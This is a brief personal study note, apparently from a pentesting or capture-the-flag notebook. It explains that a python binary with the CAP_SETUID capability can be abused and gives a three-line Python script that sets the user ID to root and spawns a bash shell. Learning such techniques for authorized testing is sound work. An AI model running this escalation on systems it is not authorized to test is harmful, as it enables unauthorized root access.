# General Concepts

**Note:** I made this cuz there are some concepts that I'm not very sure of categorizing, so yeah.

## CAP_SETUID bit

If this bit is on in a _python_ binary, refer to [**GTFOBins**](https://gtfobins.github.io/gtfobins/python/#capabilities) for further details.

But basically, if you see this bit set on _python_, use the following script:

```
import os
os.setuid(0)
os.system("/bin/bash")
```

Should be pretty self-explanatory.
